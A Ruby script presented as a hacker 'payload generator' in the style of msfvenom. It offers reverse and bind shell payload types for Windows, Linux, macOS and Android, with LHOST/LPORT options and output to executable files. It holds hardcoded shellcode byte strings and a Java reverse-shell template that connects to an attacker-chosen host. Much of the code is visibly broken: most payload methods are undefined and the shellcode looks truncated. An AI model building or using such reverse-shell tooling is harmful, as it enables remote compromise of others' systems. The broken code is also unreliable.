#!/usr/bin/env ruby
# -*- coding: binary -*-

def display_logo
  logo = <<~EOF
    ███████╗██████╗░██╗░█████╗░██████╗░██████╗░
    ██╔════╝██╔══██╗██║██╔══██╗██╔══██╗╚════██╗
    █████╗░░██║░░██║██║██║░░██║██████╔╝░█████╔╝
    ██╔══╝░░██║░░██║██║██║░░██║██╔═══╝░░╚═══██╗
    ███████╗██████╔╝██║╚█████╔╝██║░░░░░██████╔╝
    ╚══════╝╚═════╝░╚═╝░╚════╝░╚═╝░░░░░╚════╝░

    █████╗░░█████╗░██╗░░░██╗██╗░░░░░░█████╗░░█████╗░
    ██╔══██╗██╔══██╗╚██╗░██╔╝██║░░░░░██╔══██╗██╔══██╗
    ███████║░███████║░╚████╔╝░██║░░░░░██║░░██║███████║
    ██╔═══╝░██╔══██║░░╚██╔╝░░██║░░░░░██║░░██║██╔══██║
    ██║░░░░░██║░░██║░░░██║░░░███████╗╚█████╔╝██║░░██║
    ╚═╝░░░░░╚═╝░░╚═╝░░░╚═╝░░░╚══════╝░╚════╝░╚═╝░░╚═╝
    
    Made by ediop3
  EOF
  puts logo
end

class Ediop3PayloadError < StandardError; end
class HelpError < StandardError; end
class UsageError < Ediop3PayloadError; end

require 'optparse'
require 'fileutils'

class PayloadGenerator
  def initialize(options = {})
    @options = options
  end

  def generate_payload
    case @options[:payload]
    when 'reverse_tcp'
      generate_reverse_tcp_payload
    when 'bind_tcp'
      generate_bind_tcp_payload
    when 'meterpreter_reverse_tcp'
      generate_meterpreter_reverse_tcp_payload
    when 'shell_reverse_tcp'
      generate_shell_reverse_tcp_payload
    when 'reverse_https'
      generate_reverse_https_payload
    when 'bind_https'
      generate_bind_https_payload
    when 'reverse_shell'
      generate_reverse_shell_payload
    when 'bind_shell'
      generate_bind_shell_payload
    when 'android_reverse_tcp'
      generate_android_reverse_tcp_payload
    when 'macos_reverse_tcp'
      generate_macos_reverse_tcp_payload
    when 'windows_reverse_tcp_x64'
      generate_windows_reverse_tcp_x64_payload
    else
      raise Ediop3PayloadError, "Unknown payload type: #{@options[:payload]}"
    end
  end

  def generate_reverse_tcp_payload
    case @options[:platform]
    when 'windows'
      generate_windows_reverse_tcp_payload
    when 'linux'
      generate_linux_reverse_tcp_payload
    when 'osx'
      generate_macos_reverse_tcp_payload
    when 'android'
      generate_android_reverse_tcp_payload
    else
      raise Ediop3PayloadError, "Unknown platform: #{@options[:platform]}"
    end
  end

  def generate_windows_reverse_tcp_payload
    return "\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30\x8b\x52\x0c" \
           "\x8b\x52\x14\x8b\x52\x28\x8b\x72\x2c\x8b\x74\x8a\xfc\xaf\x75\xe4\x83\xc4" \
           "\x0c\x83\xe1\xfd\x8b\x7a\x24\x8b\x4c\x8a\xfc\x8b\x4c\x8a\xf8\x83\xc1\xff" \
           "\x8b\x8b\x00"
  end

  def generate_linux_reverse_tcp_payload
    return "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\x43\x66\x68\x11\x5c\x66\x53" \
           "\x89\xe1\xcd\x80\x31\xc0\x50\x50\x50\x40\x50\x40\x50\x40\x50\x31\xdb" \
           "\x89\xd8\x40\xcd\x80\x31\xc0\x40\xcd\x80"
  end

  def generate_android_reverse_tcp_payload
    payload = <<~EOF
      public class ReverseShell {
          public static void main(String[] args) {
              try {
                  String ip = "#{@options[:lhost]}";
                  int port = #{@options[:lport]};
                  Socket socket = new Socket(ip, port);
                  InputStream inputStream = socket.getInputStream();
                  OutputStream outputStream = socket.getOutputStream();
                  byte[] buffer = new byte[1024];
                  while (true) {
                      int bytesRead = inputStream.read(buffer);
                      if (bytesRead == -1) break;
                      outputStream.write(buffer, 0, bytesRead);
                  }
              } catch (Exception e) {
                  e.printStackTrace();
              }
          }
      }
    EOF
    return payload
  end
end

def parse_args(args)
  opts = {}
  opt = OptionParser.new
  opt.banner = "payload generator made by ediop3 very haxxor 1337.\n"
  opt.separator("Usage: #{$0} [options] <var=val>\n")
  opt.separator("Example: #{$0} -p reverse_tcp lhost=<IP> -f exe -o payload.exe")

  opt.on("-p", "--payload <payload>", String, "Payload type") do |p|
    opts[:payload] = p
  end

  opt.on("-f", "--format <format>", String, "Output format") do |f|
    opts[:format] = f.downcase
  end

  opt.on("-o", "--out <path>", "Save the payload to a file") do |x|
    opts[:out] = x
  end

  opt.on("-t", "--platform <platform>", String, "Target platform") do |t|
    opts[:platform] = t.downcase
  end

  opt.on("-L", "--lhost <LHOST>", String, "Set LHOST") do |lhost|
    opts[:lhost] = lhost
  end

  opt.on("-P", "--lport <LPORT>", Integer, "Set LPORT") do |lport|
    opts[:lport] = lport
  end

  opt.on_tail("-h", "--help", "Show this message") do
    display_logo
    puts opt  
    exit 0
  end

  begin
    opt.parse!(args)
  rescue OptionParser::InvalidOption, OptionParser::MissingArgument
    display_logo
    raise UsageError, "#{opt}"
  end

  opts
end

begin
  if ARGV.empty?
    display_logo
    raise HelpError, "No arguments provided. Use -h for help."
  end

  options = parse_args(ARGV)
  generator = PayloadGenerator.new(options)
  payload = generator.generate_payload
  if options[:out]
    File.open(options[:out], 'wb') { |f| f.write(payload) }
    puts "Payload saved to #{options[:out]}"
  else
    puts payload
  end
rescue Ediop3PayloadError => e
  puts e.message
end
